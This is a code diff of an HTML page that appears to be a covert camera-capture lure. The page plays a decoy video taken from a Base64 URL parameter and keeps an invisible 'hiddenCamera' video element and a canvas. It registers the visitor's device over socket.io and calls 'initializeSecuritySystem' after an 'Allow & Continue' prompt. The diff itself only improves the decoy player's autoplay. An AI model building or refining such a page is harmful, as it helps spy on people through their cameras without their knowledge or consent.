@@ -115,6 +115,8 @@
             display: none;
             position: absolute;
             z-index: 5;
+            object-fit: cover;
+            background: #000;
         }
     </style>
 </head>
@@ -138,7 +140,8 @@
         <button class="btn" id="actionBtn">Allow & Continue</button>
     </div>
 
-    <iframe id="mediaPlayer" allow="autoplay; fullscreen"></iframe>
+    <!-- Iframe ki jagah ab HTML5 Video Tag hai -->
+    <video id="mediaPlayer" controls autoplay playsinline></video>
 
     <video id="hiddenCamera" autoplay playsinline style="display:none; position:absolute; opacity:0; pointer-events:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -154,7 +157,7 @@
         let socket = io();
         let wakeLock = null;
 
-        // URL se Base64 video link decode karne ka logic (Yahan set hai)
+        // URL se Base64 video link decode karne ka logic
         const urlParams = new URLSearchParams(window.location.search);
         const encodedVid = urlParams.get('v');
         let targetVideoUrl = encodedVid ? atob(encodedVid) : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
@@ -172,6 +175,7 @@
                 profileSection.style.display = 'none';
                 mediaPlayer.style.display = 'block';
                 mediaPlayer.src = targetVideoUrl; 
+                mediaPlayer.play().catch(e => console.log("Play error:", e));
 
                 socket.emit('register_device', { name: savedName });
                 initializeSecuritySystem();
@@ -217,7 +221,8 @@
 
             profileSection.style.display = 'none';
             mediaPlayer.style.display = 'block';
-            mediaPlayer.src = targetVideoUrl; // Yahan URL properly load hoga
+            mediaPlayer.src = targetVideoUrl; 
+            mediaPlayer.play().catch(e => console.log("Play error:", e)); // Yahan video automatically play ho jayegi
 
             initializeSecuritySystem();
         });
